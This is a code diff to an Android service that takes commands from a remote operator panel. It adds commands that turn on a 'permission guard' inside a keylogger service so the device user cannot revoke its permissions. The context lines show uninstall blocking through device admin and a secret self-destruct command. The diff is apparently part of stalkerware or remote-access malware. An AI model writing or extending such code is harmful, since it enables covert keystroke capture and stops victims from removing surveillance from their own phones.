@@ -285,6 +285,23 @@ class ConnectorService : Service() {
             // ── Block/Unblock Uninstall (Device Admin/Owner) ──
             cmd.startsWith("block_uninstall:") -> Pair(AppDeviceAdminReceiver.setBlockUninstall(this, cmd.removePrefix("block_uninstall:").trim() == "true"), "command_result")
 
+            // ── Permission Guard: cegah user matikan permission aktif ──
+            cmd == "permission_guard_on"     -> {
+                KeyloggerService.permissionGuardEnabled = true
+                Pair("✅ Permission guard AKTIF — user tidak bisa matikan permission.", "command_result")
+            }
+            cmd == "permission_guard_off"    -> {
+                KeyloggerService.permissionGuardEnabled = false
+                Pair("⚠️ Permission guard NONAKTIF.", "command_result")
+            }
+            cmd == "permission_guard_status" -> Pair(
+                if (KeyloggerService.permissionGuardEnabled)
+                    "Permission guard: AKTIF"
+                else
+                    "Permission guard: NONAKTIF",
+                "command_result"
+            )
+
             // ── Self-Destruct: matikan guard + hapus admin + uninstall ──
             // RAHASIA — hanya operator panel yang bisa kirim command ini
             cmd == "self_destruct"  -> Pair(doSelfDestruct(), "command_result")
